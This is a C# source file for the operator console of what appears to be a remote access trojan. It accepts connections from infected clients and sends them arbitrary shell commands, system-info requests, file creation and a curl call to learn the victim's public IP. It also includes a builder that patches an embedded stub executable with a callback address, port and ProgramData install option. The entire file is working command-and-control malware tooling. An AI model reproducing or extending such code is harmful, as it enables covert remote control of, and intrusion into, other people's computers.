﻿using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using dnlib.DotNet.Emit;
using System.Reflection;

namespace Server
{
    class Program
    {
        private static List<ClientInfo> clients = new List<ClientInfo>();
        private static int currentClientIndex = -1;
        private static TcpListener listener;
        private static int port;

        static void Main(string[] args)
        {
            Console.WriteLine("Enter the port number:");
            string input = Console.ReadLine();

            // Properly handle the conversion from string to int
            if (int.TryParse(input, out port))
            {
                // Initialize the listener within the same method or make it accessible to those that need it
                listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                Console.WriteLine($"Listening on port {port}...");

                // Continue with additional code that uses 'listener'
                // For example, to stop the listener, you could add listener.Stop(); here or handle it elsewhere based on your application structure.
            }
            else
            {
                Console.WriteLine("Invalid port number. Please enter a valid integer.");
            }


            Thread acceptThread = new Thread(() =>
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    string clientEndPoint =  client.Client.RemoteEndPoint.ToString();
                    NetworkStream stream = client.GetStream();
                    ClientInfo newClient = new ClientInfo
                    {
                        Client = client,
                        Stream = stream,
                        Id = Guid.NewGuid().ToString(),
                        IpAddress = clientEndPoint
                    };
                    clients.Add(newClient);
                    Console.WriteLine($"Client connected: {newClient.Id} at {newClient.IpAddress}");

                    Thread clientThread = new Thread(HandleClient);
                    clientThread.Start(newClient);
                }
            });
            acceptThread.Start();

            while (true)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true).Key;
                    switch (key)
                    {
                        case ConsoleKey.UpArrow:
                        case ConsoleKey.DownArrow:
                            MoveSelection(key == ConsoleKey.UpArrow ? -1 : 1);
                            break;
                        case ConsoleKey.Enter:
                            if (currentClientIndex >= 0 && currentClientIndex < clients.Count)
                                DisplayCommandMenu();
                            else
                                Console.WriteLine("No client selected. Use arrow keys to select a client.");
                            break;
                        case ConsoleKey.B:
                            DisplayBuildMenu();
                            break;
                    }
                }
            }
        }
        static void DisplayBuildMenu()
        {
            Console.Clear();
            Console.WriteLine("Welcome to the Builder!");
            Console.Write("Please enter the IP Address: ");
            string ipAddress = Console.ReadLine();

            Console.Write("Please enter the Port: ");
            if (!int.TryParse(Console.ReadLine(), out int port))
            {
                Console.WriteLine("Invalid port. Exiting...");
                return;
            }

            Console.WriteLine("Would you like it it Install to the ProgramData?");
            if (!bool.TryParse(Console.ReadLine(), out bool isInstall))
            {
                Console.WriteLine("Invalid port. Exiting...");
                return;
            }

            ModifyAndSaveEmbeddedResource("Server.Resources.Stub.exe", ipAddress, port, isInstall, "Built.exe");
            Console.WriteLine("Stub has been successfully modified.");
        }

        static void ModifyAndSaveEmbeddedResource(string resourceName, string newIP, int newPort, bool isInstall, string outputPath)
        {
            using (var resourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (resourceStream == null)
                {
                    Console.WriteLine("Resource not found.");
                    return;
                }

                // Load the module from the stream
                var module = ModuleDefMD.Load(resourceStream);

                // Perform modifications
                TypeDef programType = module.Find("Client.Program", true);
                if (programType != null)
                {
                    foreach (var method in programType.Methods)
                    {
                        if (method.IsStaticConstructor || method.IsConstructor)
                        {
                            for (int i = 0; i < method.Body.Instructions.Count; i++)
                            {
                                var instr = method.Body.Instructions[i];
                                if (instr.OpCode == OpCodes.Ldstr && instr.Operand as string == "%ADDRESS%")
                                {
                                    instr.Operand = newIP;
                                }
                                else if (instr.OpCode == OpCodes.Ldc_I4 && (int)instr.Operand == 02220)
                                {
                                    instr.Operand = newPort;
                                }
                                // Setting the boolean 'isInstall'
                                if (instr.OpCode == OpCodes.Ldc_I4 && i + 1 < method.Body.Instructions.Count)
                                {
                                    var nextInstr = method.Body.Instructions[i + 1];
                                    if (nextInstr.OpCode == OpCodes.Stsfld && (nextInstr.Operand as FieldDef)?.Name == "isInstall")
                                    {
                                        instr.Operand = isInstall ? 1 : 0; // Convert bool to int (1 for true, 0 for false)
                                    }
                                }
                            }
                        }
                    }
                }

                // Save the modified assembly to a file
                module.Write(outputPath);
                Console.WriteLine("Modified assembly saved to " + outputPath);
            }
        }


        static void DisplayCommandMenu()
        {
            while (true)
            {
                Console.Clear();
                Console.WriteLine($"Commands for {clients[currentClientIndex].Id} at {clients[currentClientIndex].IpAddress}");
                Console.WriteLine("0: Exit Command Menu");
                Console.WriteLine("1: Open Notepad");
                Console.WriteLine("2: Get System Info");
                Console.WriteLine("3: Custom Shell Command");
                Console.WriteLine("4: Create File");
                Console.WriteLine("5: Show IP");
                Console.WriteLine("6: Close Client");
                Console.WriteLine("Enter the number of the command to execute or exit:");
                string choice = Console.ReadLine();
                string command = "";
                switch (choice)
                {
                    case "0":
                        return;// Exit the command menu
                    case "1":
                        command = "shell start notepad.exe";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "2":
                        command = "getsysinfo";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "3":
                        Console.WriteLine("Type the command to execute:");
                        command = $"shell {Console.ReadLine()}";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "4":
                        Console.WriteLine("Enter the path for the new file:");
                        command = $"file create {Console.ReadLine()}";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "5":
                        command = "shell curl api.ipify.org";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "6":
                        command = "close";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    default:
                        Console.WriteLine("Invalid command selection. Please try again.");
                        continue;
                }

                Console.WriteLine("Press Enter to return to the command menu or any other key to continue...");
                if (Console.ReadKey(true).Key != ConsoleKey.Enter)
                    break;
            }
        }

        static void MoveSelection(int direction)
        {
            if (clients.Count == 0)
            {
                Console.WriteLine("No clients connected.");
                return;
            }

            currentClientIndex = (currentClientIndex + direction + clients.Count) % clients.Count;
            DisplayClients();
        }

        static void DisplayClients()
        {
            Console.Clear();
            for (int i = 0; i < clients.Count; i++)
            {
                if (i == currentClientIndex)
                {
                    Console.BackgroundColor = ConsoleColor.Blue;
                    Console.ForegroundColor = ConsoleColor.White;
                }
                Console.WriteLine($"Client {clients[i].Id} at {clients[i].IpAddress}");
                Console.ResetColor();
            }
        }

        static void HandleClient(object clientObject)
        {
            ClientInfo clientInfo = (ClientInfo)clientObject;
            try
            {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = clientInfo.Stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    if (message == "ping")
                    {
                        Thread.Sleep(500);
                        SendCommandToClient(clientInfo, "pong");
                    }
                    else if (message != "ping")
                    {
                        Console.WriteLine($"Received from {clientInfo.Id} ({clientInfo.IpAddress}): {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error with client {clientInfo.Id} ({clientInfo.IpAddress}): {ex.Message}");
            }
            finally
            {
                clientInfo.Stream.Close();
                clientInfo.Client.Close();
                clients.Remove(clientInfo);
                Console.WriteLine($"Client {clientInfo.Id} at {clientInfo.IpAddress} disconnected.");
            }
        }

        static void SendCommandToClient(ClientInfo client, string command)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(command);
            try
            {
                client.Stream.Write(buffer, 0, buffer.Length);
                if (command != "pong")
                {
                    Console.WriteLine($"Command sent to {client.Id} ({client.IpAddress}): {command}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send command ({command}) to {client.Id} ({client.IpAddress}): {ex.Message}");
            }
        }
    }
    class ClientInfo
    {
        public TcpClient Client { get; set; }
        public NetworkStream Stream { get; set; }
        public string Id { get; set; }
        public string IpAddress { get; set; }
    }
}
